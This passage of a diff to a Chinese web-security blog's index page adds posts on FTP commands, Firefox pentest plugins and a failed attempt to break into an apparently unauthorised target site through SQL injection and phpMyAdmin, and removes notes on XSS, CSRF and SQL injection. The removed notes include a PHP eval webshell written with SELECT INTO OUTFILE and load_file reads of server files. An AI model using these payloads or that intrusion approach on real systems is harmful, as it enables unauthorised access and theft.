3，若设为0，表示取消debug。<br>17.dir[remote-dir][local-file]：显示远程主机目录，并将结果存入本地文件。<br>18.disconnection：同close。<br>19.form format：将文件传输方式设置为format，缺省为file方式。<br>20.get remote-file[local-file]： 将远程主机的文件remote-file传至本地硬盘的local-file。<br>21.glob：设置mdelete，mget，mput的文件名扩展，缺省时不扩展文件名，同命令行的-g参数。<br>22.hash：每传输1024字节，显示一个hash符号(#)。<br>23.help[cmd]：显示ftp内部命令cmd的帮助信息，如：help get。<br>24.idle[seconds]：将远程服务器的休眠计时器设为[seconds]秒。<br>25.image：设置二进制传输方式(同binary)。<br>26.lcd[dir]：将本地工作目录切换至dir。<br>27.ls[remote-dir][local-file]：显示远程目录remote-dir， 并存入本地文件local-file。<br>28.macdef macro-name：定义一个宏，遇到macdef下的空行时，宏定义结束。<br>29.mdelete[remote-file]：删除远程主机文件。<br>30.mdir remote-files local-file：与dir类似，但可指定多个远程文件，如 ：mdir </em>.o.*.zipoutfile 。<br>31.mget remote-files：传输多个远程文件。<br>32.mkdir dir-name：在远程主机中建一目录。<br>33.mls remote-file local-file：同nlist，但可指定多个文件名。<br>34.mode[modename]：将文件传输方式设置为modename， 缺省为stream方式。<br>35.modtime file-name：显示远程主机文件的最后修改时间。<br>36.mput local-file：将多个文件传输至远程主机。<br>37.newer file-name： 如果远程机中file-name的修改时间比本地硬盘同名文件的时间更近，则重传该文件。<br>38.nlist[remote-dir][local-file]：显示远程主机目录的文件清单，并存入本地硬盘的local-file。<br>39.nmap[inpattern outpattern]：设置文件名映射机制， 使得文件传输时，文件中的某些字符相互转换， 如：nmap $1.$2.$3[$1，$2].[$2，$3]，则传输文件a1.a2.a3时，文件名变为a1，a2。该命令特别适用于远程主机为非UNIX机的情况。<br>40.ntrans[inchars[outchars]]：设置文件名字符的翻译机制，如ntrans1R，则文件名LLL将变为RRR。<br>41.open host[port]：建立指定ftp服务器连接，可指定连接端口。<br>42.passive：进入被动传输方式。<br>43.prompt：设置多个文件传输时的交互提示。<br>44.proxy ftp-cmd：在次要控制连接中，执行一条ftp命令， 该命令允许连接两个ftp服务器，以在两个服务器间传输文件。第一条ftp命令必须为open，以首先建立两个服务器间的连接。<br>45.put local-file[remote-file]：将本地文件local-file传送至远程主机。<br>46.pwd：显示远程主机的当前工作目录。<br>47.quit：同bye，退出ftp会话。<br>48.quote arg1，arg2…：将参数逐字发至远程ftp服务器，如：quote syst.<br>49.recv remote-file[local-file]：同get。<br>50.reget remote-file[local-file]：类似于get， 但若local-file存在，则从上次传输中断处续传。<br>51.rhelp[cmd-name]：请求获得远程主机的帮助。<br>52.rstatus[file-name]：若未指定文件名，则显示远程主机的状态， 否则显示文件状态。<br>53.rename[from][to]：更改远程主机文件名。<br>54.reset：清除回答队列。<br>55.restart marker：从指定的标志marker处，重新开始get或put，如：restart 130。<br>56.rmdir dir-name：删除远程主机目录。<br>57.runique：设置文件名只一性存储，若文件存在，则在原文件后加后缀.1， .2等。<br>58.send local-file[remote-file]：同put。<br>59.sendport：设置PORT命令的使用。<br>60.site arg1，arg2…：将参数作为SITE命令逐字发送至远程ftp主机。<br>61.size file-name：显示远程主机文件大小，如：site idle 7200。<br>62.status：显示当前ftp状态。<br>63.struct[struct-name]：将文件传输结构设置为struct-name， 缺省时使用stream结构。<br>64.sunique：将远程主机文件名存储设置为只一(与runique对应)。<br>65.system：显示远程主机的操作系统类型。<br>66.tenex：将文件传输类型设置为TENEX机的所需的类型。<br>67.tick：设置传输时的字节计数器。<br>68.trace：设置包跟踪。<br>69.type[type-name]：设置文件传输类型为type-name，缺省为ascii，如:type binary，设置二进制传输方式。<br>70.umask[newmask]：将远程服务器的缺省umask设置为newmask，如：umask 3<br>71.user user-name[password][account]：向远程主机表明自己的身份，需要口令时，必须输入口令，如：user anonymous my@email。<br>72.verbose：同命令行的-v参数，即设置详尽报告方式，ftp 服务器的所有响 应都将显示给用户，缺省为on.<br>73.?[cmd]：同help.</p>
+</blockquote>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+	<div class="article-category tagcloud">
+	<a class="article-category-link" href="/categories/websec/">Web安全</a>
+	</div>
+
+
+      
+        
+<div class="counter-tag counter">
+    <span id="/2018/12/27/命令-cmd命令总结/" class="leancloud_visitors post-title-link"
+          style="font-size: 12px" data-flag-title="命令#cmd命令总结">
+         &nbsp;
+        view
+    </span>
+</div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-记一次拿服务器失败的测试" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/12/11/记一次拿服务器失败的测试/" class="article-date">
+  	<time datetime="2018-12-10T23:24:17.000Z" itemprop="datePublished">2018-12-11</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/12/11/记一次拿服务器失败的测试/">
+        记一次拿服务器失败的测试
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <pre><code>随着天气逐渐变凉，实在不想再去图书馆充实自己的精神领域！！！但又不想荒废这大好时光，于是乎就搞搞中国宝岛的小站吧！！！
+</code></pre><p>首先打开网站主页。<br><img src="/2018/12/11/记一次拿服务器失败的测试/zy.png"><br>    如图就是一个一般的门户网站，炸一看除了产品介绍，和新闻这两项可能存在SQL注入，基本上没有什么可测得。<br>    于是乎打开Nmap，这款号称扫描之王的神器，扫了一波，扫描同时再手动测试一波看看有没有SQl注入漏洞，Nmap得到如下结果：<br><img src="/2018/12/11/记一次拿服务器失败的测试/dk.png"><br>    发现扫描结果中，只开启80和81端口。80端口就不用说了，好奇81端口是啥？于是乎打开Google，发现有点二小惊喜！哈！哈！哈！<br>    如图：<br><img src="/2018/12/11/记一次拿服务器失败的测试/phpmyadmin.png"><br>    惊不惊喜，意不意外！<br>    打开御剑开始扫描，看看能不能扫出后台，或者前辈留下的shell，亦或者开发人员遗留下来的测试文件等！基础字典没发现后台，也没发现shell。但是一个“aa.php”成功的吸引了我。没想到又是一个小惊喜！<br><img src="/2018/12/11/记一次拿服务器失败的测试/aa.png"><br>    正在为如何爆破PHPMyadmin纠结时，又发现更惊喜的了！！！主页竟然存在一个SQL注入漏洞。哈！哈！哈！<br>    于是乎就又拿出了，另一款神器SQLmap,忽然发现竟是root用户！！！今天还真是惊喜连连啊！！！毕竟MYsql的root用户在Linux中是很少见的。心想今天难道要拿到Linux的服务器了？通过SQL注入漏洞拿到MYSQL的root用户的密码，很自然的通过phpMyadmin进入数据库。<br>    如图：<br><img src="/2018/12/11/记一次拿服务器失败的测试/sql.png"><br>    经过一阵Google操作发现还是可以通过phpmyadmin拿到shell的，但是这种操作都是别的：<br><img src="/2018/12/11/记一次拿服务器失败的测试/cs.png"><br>    将“general log”改为“ON”，这一步很顺利，毫无疑问！但是在更改“general log file”时。开始衰了！！！本想通过“aa.php”获得的信息更改，可是，可是…<br><img src="/2018/12/11/记一次拿服务器失败的测试/xk.png"><br>竟然不让更改！于是乎进行另一种利用phpMyadmin拿shell的方法。结果如图：<br><img src="/2018/12/11/记一次拿服务器失败的测试/hq.png"><br>经过Google发现原来是管理员更改了配置，可以执行“show variables like ‘%secure%’”查看“secure-file_priv”的当前值。<br><img src="/2018/12/11/记一次拿服务器失败的测试/sec.png"><br>导出的数据必须是这个值得路径才可以。默认有可能是Null代表禁止导出若需要可以在my.ini中更改！更改后需要重启数据库！<br><img src="/2018/12/11/记一次拿服务器失败的测试/1.png"><br>但是不能访问啊！好气，看来运气前期用完了啊！！！<br><img src="/2018/12/11/记一次拿服务器失败的测试/2.png"><br>但是，还是学到了好多…</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+	<div class="article-category tagcloud">
+	<a class="article-category-link" href="/categories/websec/">Web安全</a>
+	</div>
+
+
+      
+        
+<div class="counter-tag counter">
+    <span id="/2018/12/11/记一次拿服务器失败的测试/" class="leancloud_visitors post-title-link"
+          style="font-size: 12px" data-flag-title="记一次拿服务器失败的测试">
+         &nbsp;
+        view
+    </span>
+</div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-火狐浏览器优化" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/12/07/火狐浏览器优化/" class="article-date">
+  	<time datetime="2018-12-06T23:40:01.000Z" itemprop="datePublished">2018-12-07</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/12/07/火狐浏览器优化/">
+        火狐优化
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>无意间看到一篇博客，是关于渗透测试过程中，火狐浏览器常见插件配置的，所以在闲来无事之际，亲身实践了一波，并记录以下过程，方便以后配置安装。</p>
+<p>在渗透测试过程中，有以下插件比较常用：<br>（1）Wappalyzer<br>（2）Foxyproxy<br>（3）Cookies Manager+<br>（4）HackBar<br>（5）HtppRequester<br>（6）RESTClient<br>（7）User—Agent Swittcher<br>（8）Tampermonkey<br>（9）Tamper Data<br>（10）Tamper Icon Redux</p>
+<p>这些插件的用途如下：</p>
+<p>HackBar:一个非常简单的插件，可以帮助我们尝试不同的输入值，而无需更改或重写完整的URL。在手工检查跨站点脚本编写和注入时，我们将经常使用这种方法。它可以使用F9键激活。<br>cookie Manager+:这个附加组件允许我们查看和修改浏览器从应用程序接收到的cookie的值。<br>User-Agent Switcher:此插件允许我们修改用户代理字符串(浏览器标识符)，该字符串在发送到服务器的所有请求中。应用程序有时使用这个字符串显示或隐藏某些元素，这取决于所使用的浏览器和操作系统。<br>Tamper Data:这个附加组件能够捕获浏览器发送给服务器的任何请求，让我们有机会在应用程序的表单中引入数据并到达服务器之前修改数据。<br>Tamper Data Icon Redux只添加一个图标。<br>FoxyProxy Standard:一个非常有用的插件，允许我们使用用户提供的预设，在一次点击中改变浏览器的代理设置。Wappalyzer:这是一个用来识别网站中使用的平台和开发工具的工具。这对于提取web服务器及其使用的软件非常有用。<br>HttpRequester:使用这个插件，可以处理HTTP请求，包括get、post和put方法，并观察来自服务器的原始响应。<br>RESTClient:这基本上是一个像HTTP请求者一样的请求生成器，但主要关注REST web服务。它包括添加标题、不同的身份验证模式以及get、post、put和delete方法的选项。<br>Tampermonkey:这个插件允许我们在浏览器中安装用户脚本，并在加载之前或之后对web页面内容进行动态更改。从渗透测试的角度来看，这有助于绕过客户端控件和其他客户端代码操作。</p>
+<p>附上图片一张：<br><img src="/2018/12/07/火狐浏览器优化/1.png"></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+	<div class="article-category tagcloud">
+	<a class="article-category-link" href="/categories/websec/">Web安全</a>
+	</div>
+
+
+      
+        
+<div class="counter-tag counter">
+    <span id="/2018/12/07/火狐浏览器优化/" class="leancloud_visitors post-title-link"
+          style="font-size: 12px" data-flag-title="火狐优化">
+         &nbsp;
+        view
+    </span>
+</div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-python扫描脚本" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -619,300 +908,9 @@
 
 
   
-    <article id="post-XSS" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2018/04/18/XSS/" class="article-date">
-  	<time datetime="2018-04-18T04:57:37.000Z" itemprop="datePublished">2018-04-18</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/04/18/XSS/">
-        XSS
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><code>关于XSS漏洞</code>：<br>（1）反射型：通过外部输入直接在在浏览器端触发。<br>（2）储存型：先把利用代码保存在数据库或文件中，当web程序读取利用代码并输出时触发漏洞。<br><code>危害</code>：盗取cookies，修改页面钓鱼等，凡是前端页面能做的，XSS都能做。<br><code>XSS出现的地方</code>：<br>XSS漏洞经常出现在文章发表，评论回复，留言以及资料设置等地方。特别是在文章发表的时候，由于大都是富文本，<br>各种图片的引用，文字格式的设置等，故而经常出现过滤不严造成的XSS，同样，留言评论也是如此。而在资料设置的<br>地方，比如用户昵称，签名等，有的应用不止一处设置资料的地方，在注册的地方，修改资料的地方都可以，不一定都<br>进行了严格的过滤。这几个地方通常都是储存型XSS。<br><code>关于反射型</code>：<br>这种漏洞比较容易，通过黑盒扫描器直接发现，只需要将尖括号，单双引号等直接提交到web服务器，再检查返回的HTML页面<br>有没有保留原来的特殊字符即可，在白盒测试中，需要寻找带有参数输出的函数，然后根据输出函数对输出内容回溯输入参数，<br>观察有没有过滤。<br><code>关于储存型XSS</code>：<br>储存型XSS比反射型容易利用的多，不用考虑绕过浏览器的过滤，隐蔽性也比较好，特别在社交网络中，储存型XSS蠕虫病毒易造成<br>大面积传播，影响巨大。要挖掘储存型XSS也要挖掘未过滤的输入点和未过滤的输出点，然而这个最终的输出点可能跟输入点完全不<br>在一个业务上。在白盒审计时可以根据当前代码去猜，或者去追查哪里右操作过这些数据，使用表名，字段名在代码里搜索。<br><code>漏洞防范</code>：<br>XSS漏洞在不同的浏览器有不同的利用方式，特别是业务上使用富文本编辑器的时候，防御起来更为复杂。<br>（1）特殊字符HTML实体转码<br>需要过滤的字符有单引号，双引号，尖括号，反斜杠，冒号，&amp;，#等。为了保持数据的原始性，最好的的过滤方式是在输出和二次调<br>用的时候进行HTML实体转码。<br>（2）标签事件属性黑名单或者白名单<br>通过过滤特殊字符防止XSS漏洞，实际中过滤了也可能被绕过，比如通过宽字节注入合并掉反斜杠，再利用标签事件来执行js代码，故<br>而还要通过标签事件的黑白名单的方式，推荐使用白名单的方式。可通过正则匹配的方式，若匹配不在白名单列表直接拦掉。</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-	<div class="article-category tagcloud">
-	<a class="article-category-link" href="/categories/websec/">Web安全</a>
-	</div>
-
-
-      
-        
-<div class="counter-tag counter">
-    <span id="/2018/04/18/XSS/" class="leancloud_visitors post-title-link"
-          style="font-size: 12px" data-flag-title="XSS">
-         &nbsp;
-        view
-    </span>
-</div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-CSRF" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2018/04/18/CSRF/" class="article-date">
-  	<time datetime="2018-04-18T04:37:59.000Z" itemprop="datePublished">2018-04-18</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/04/18/CSRF/">
-        CSRF
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><code>关于CSRF请求伪造</code>：<br>就是可以劫持其它用户进行一些请求，而这个CSRF的危害性就取决于该请求是什么操作了，主要用于越权操作故而经常出现在有权限控制的地方。<br>像管理后台，会员中心，论坛帖子，交易管理等。<br><code>利用条件：</code><br>（1）浏览器登录了当前所预想的权限用户。<br>（2）构造实现目标所需要的请求。<br><code>挖掘要点</code>：<br>首先打开几个非静态页面，抓包看看有没有token，如果没有token的话，再直接请求这个页面，若不带referer，并且返回的数据还相同。则很有可<br>能就是CSRF漏洞了。在白盒测试中，就要看看几个核心文件有没有验证token和referer的相关代码。<br><code>漏洞防范</code>：<br>防御CSRF漏洞的最主要问题就是解决可信问题，即使管理员权限提交到服务器的数据也是不完全可信的，故而做到如下两点防御措施：<br>（1）增加token、referer验证避免img标签请求的水坑攻击。<br>（2）增加验证码。<br>其中token验证是使用最多的一种，也是效果最好的一种，可以理解为在页面或cookie里面加一个不可预测的字符串，服务器在接收操作请求的时候<br>验证一下这个字符串是不是上次访问留下来的即可判断是不是可信请求，因为不访问上一个页面是无法得到这个token的。除非通过XSS漏洞或者其它<br>手段得到通信数据。<br>而考虑到用户体验验证码就没有token实用了，不可能让用户每个页面都输入验证码，说以验证码只用在像登录页面这样的敏感操作中。其实现方式<br>跟token差不多，都是在上一个页面生成一个随机数，看看前台提交过来的是否一致。</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-	<div class="article-category tagcloud">
-	<a class="article-category-link" href="/categories/websec/">Web安全</a>
-	</div>
-
-
-      
-        
-<div class="counter-tag counter">
-    <span id="/2018/04/18/CSRF/" class="leancloud_visitors post-title-link"
-          style="font-size: 12px" data-flag-title="CSRF">
-         &nbsp;
-        view
-    </span>
-</div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-SQL注入" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2018/03/07/SQL注入/" class="article-date">
-  	<time datetime="2018-03-07T06:11:39.000Z" itemprop="datePublished">2018-03-07</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/03/07/SQL注入/">
-        SQL注入
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><code>SQL注入原理：</code>由于开发者编辑操作数据库的代码时，直接将外部可控的参数拼接到SQL语句中，没有经过过滤直接放入数据库引擎中执行。<br>由于SQL注入直接面向数据库进行攻击的，所以其危害最大。<br><code>SQL注入的攻击方式：</code><br>（1）权限较大的情况下，通过SQL注入直接写入webSell，或者直接执行系统命令。<br>（2）权限较小的情况下，可以通过SQL注入获取管理员密码等信息，或者修改数据库内容进行一些钓鱼或者其它间接利用。<br>由于SQL注入是利用最多的漏洞，因此界内对其研究也最深，其分类有：<br>（1）普通注入（2）盲注（3）报错注入（4）宽字节注入（5）二次注入<br>     而在自动化利用工具中，sqlmap几乎能测试以上任意一种注入漏洞。<br><code>SQL注入漏洞经常出现的地方</code>：<br>（1）登录页面<br>（2）HTTP头<br>（3）订单处理的地方<br>因为以上几个地方业务逻辑相对比较复杂，页面登录的注入一般发生在HTTP头里面的Client-ip和X-forword-for中，一般用来记录IP地址。<br>而在订单系统里面，由于订单涉及购物车等多个交互，经常会发生二次注入。<br><code>关于普通注入</code>：<br>普通注入是最容易利用的SQL注入漏洞，比如直接通过union查询就可以查询数据库，普通注入有int型和string型，其中<br>string型需要用单引号或者双引号闭合。<br><code>关于编码注入</code>：<br>程序在进行操作之前经常进行一些编码操作，而这些编码处理的函数也是存在问题的，若输入编码函数不兼容的特殊字符，<br>可导致输出的字符变为有害数据。在SQL注入里面，常见的编码注入有Mysql宽字节注入，以及urldecode/rawurldecode函数导致的。<br><code>宽字节注入的形成条件</code>：<br>使用PHP连接Mysql时，当设置‘set character_set_client=gbk’会导致一个编码转换的注入问题，及宽字节注入。<br>只要注入参数中代入‘%df%27’即可把程序中过滤的‘\’，（%5c）合并掉。‘%df%5c’&lt;===&gt;‘緷’，故而完成闭合。<br><code>其原因就是</code>:<br>当set character_set_client=’gbk’时，就是告诉Mysql服务器，客户端来源数据的编码为GBK，然后Mysql服务器对查询语句进行GBK编码，导<br>致‘\’被‘%df’合并掉。<br>通常在开发过程中，不直接设置set character_set_client=gbk,而是设置SET NAMES ‘gbk’,其实后者不过比前者多干了两件事，后者等同于：<br>SET<br>character_set_connection=’gbk’,<br>character_set_results=’gbk’,<br>character_set_client=’gbk’<br>这样同样存在漏洞，另外使用mysql_set_charset的方式同样存在漏洞，因为它也是调用了 SET NAMES。不过mysql_set_charsset调用SET NAMES<br>之后记录当前的编码方式，留个后面mysql_real_escape_string处理字符串的时候使用。<br><code>如何解决宽字节注入</code>：<br>（1）在执行查询前，先执行SET NAMES ‘gbk’;character_set_client=’binary’。<br>（2）使用mysql_set_charset(‘gbk’)设置编码，然后使用mysql_real_escape_string()函数过滤。<br>（3）使用PDO方式进行预处理。<br><code>关于二次URLdecode注入</code>：如果某处使用了 urldecode()或者rawurldecode()则会导致二次解码生成单引号引发注入。<br><code>原理</code>：当我们提交参数到webserver时，Webserver会自动解码一次，假设目标程序开启了GPC，我们提交了1.php?id=1%2527，因为提交的参数<br>里面没有单引号，第一次解码后的结果为：1%27。%25的编码为%，若程序里面使用了urldecode()或者rawurldecode()来解码id参数，故解码后的<br>参数为：id=1’从而引发了注入。<br><code>漏洞防范</code>：<br>（1）对于string型注入，通常开启GPC中的magic_quotes_gpc&lt;负责对GET，POST，COOKIE的 值进行过滤&gt;和magic_quotes_runtime&lt;负责对从数据<br>库或者文件中获取的数据进行过滤&gt;可以防止。因为这两个选项仅仅对’,”,\,NULL进行过滤，故不能防范int型注入。<br>（2）通过过滤函数和类进行过滤，在框架中可在程序入口运用类统一过滤，在SQL语句中可用PHP内置函数进行过滤。也有一些开源类可对union，<br>select等关键字进行过滤。<code>addslashes()</code>的过滤范围和GPC一样，若没有开启GPC，可用它来过滤，但是他的参数必须是string类型的。当传入的值<br>是一个数组时，可能存在绕过。<code>mysql[_real]_escape_string()</code>这两个函数都是对字符串进行过滤，两者的不同在于 mysql_real_escape_string()<br>接收的是一个连接句柄，并根据当前字符集进行转义。故推荐使用mysql_real_escape_string()。<code>intval()</code>在以上过滤方式中，对int型的注入效果<br>并不好，可以通过报错，或者盲注的方式绕过。可以通过intval()将其转换为int型。其原理相当于白名单方式，对应的还有floatval()等。<br>例如：<br>&lt;?php<br>    $id=intval(“1 union select “);<br>    echo $id;<br>?&gt;<br>输出结果：1。<br>（3）也可用PDO预处理防范注入。若PHP&lt;5.3.6还是存在宽字节注入漏洞的。原因在于使用了PHP本地模拟prepare，再把完整的SQL语句发送给Mysql服务<br>器，并且使用了SET NAMES GBK的语句，所以就有PHP和MYsql编码不一致导致注入问题。应该使用ATTR_EMULATE_PREPARES来禁用PHP本地模拟prepare。<br><code>导出目标主机某文件到已知目录下</code>：<br>（1）使用条件：<br> A、必须有权限读取并且文件必须完全可读<br>and(select count(<em>)from mysql.user)&gt;0/</em> 如果结果返回正常,说明具有读写权限。<br>and(select count(<em>)from mysql.user)&gt;0/</em> 返回错误，应该是管理员给数据库帐户降权<br>B、欲读取文件必须在服务器上<br>C、必须指定文件完整的路径<br>D、欲读取文件必须小于 max_allowed_packet<br><code>导入文件</code>：<br>SELECT…..INTOOUTFILE’file_name’<br>可以把被选择的行写入一个文件中。该文件被创建到服务器主机上，因此您必须拥有 FILE 权限，才能使用此语法。file_name 不能是一个已经存<br>在的文件。<br>第一种直接将 select 内容导入到文件中：<br>Selectversion()intooutfile“c:\phpnow\htdocs\test.php”此处将 version()替换成一句话，&lt;?php@eval($_post[“mima”])?&gt;也即<br>Select &lt;?php@eval($_post[“mima”])?&gt; intooutfile“c:\phpnow\htdocs\test.php”<br>直接连接一句话就可以了，其实在 select 内容中不仅仅是可以上传一句话的，也可以上传很多的内容。第二种修改文件结尾：<br>Selectversion()Intooutfile“c:\phpnow\htdocs\test.php”LINESTERMINATEDBY0x16进制文件<br>解释：通常是用‘\r\n’结尾，此处我们修改为自己想要的任何文件。同时可以用 FIELDS TERMINATED BY 16进制可以为一句话或者其他任何的代码，<br>可自行构造。<br>上述我们提到了load_file(),但是当前台无法导出数据的时候，我们可以利用下面的语句：<br>selectload_file(‘c:\wamp\bin\mysql\mysql5.6.17\my.ini’)intooutfile ‘c:\wamp\www\test.php’<br>可以利用该语句将服务器当中的内容导入到 web 服务器下的目录，这样就可以得到数据了。<br>上述 my.ini当中存在 password 项（不过默认被注释），当然会有很多的内容可以被导出来， 这个要平时积累。</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-	<div class="article-category tagcloud">
-	<a class="article-category-link" href="/categories/websec/">Web安全</a>
-	</div>
-
-
-      
-        
-<div class="counter-tag counter">
-    <span id="/2018/03/07/SQL注入/" class="leancloud_visitors post-title-link"
-          style="font-size: 12px" data-flag-title="SQL注入">
-         &nbsp;
-        view
-    </span>
-</div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-博客常用语法语法" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2018/01/01/博客常用语法语法/" class="article-date">
-  	<time datetime="2017-12-31T17:25:22.000Z" itemprop="datePublished">2018-01-01</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/01/01/博客常用语法语法/">
-        博客常用语法
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>经过一番波折终于把自己的博客搭建起来了，以后也算有了自己的一片小天地….<br>连接：ssh -T <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a><br>创建项目：hexo new post “***”<br>部署到远程：hexo d -g<br>文字超链接：<a href="http://www.baidu.com" target="_blank" rel="noopener">百度</a><br>更改主题：git clone <a href="https://github.com/iissnan/hexo-theme-next" target="_blank" rel="noopener">https://github.com/iissnan/hexo-theme-next</a> themes/next<br>          hexo clean 清空之前的主题<br>          hexo g 生成静态文件<br>          hexo s 在本地运行<br>          hexo d 发布到github上<br>部分文字高亮：You a <code>Strong</code> boy!!!</p>
-<ul>
-<li>姓名：小飞飞</li>
-<li>性别：男</li>
-<li><p>爱好：8866</p>
-</li>
-<li><p>编程语言</p>
-<ul>
-<li>脚本语言<ul>
-<li>php</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<img src="/2018/01/01/博客常用语法语法/456.png" title="这是一个博客的图片说明">
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-	<div class="article-category tagcloud">
-	<a class="article-category-link" href="/categories/other/">other</a>
-	</div>
-
-
-      
-        
-<div class="counter-tag counter">
-    <span id="/2018/01/01/博客常用语法语法/" class="leancloud_visitors post-title-link"
-          style="font-size: 12px" data-flag-title="博客常用语法">
-         &nbsp;
-        view
-    </span>
-</div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/4/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span>
+      <a class="extend prev" rel="prev" href="/page/4/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/6/">Next &raquo;</a>
     </nav>
   
 </div>
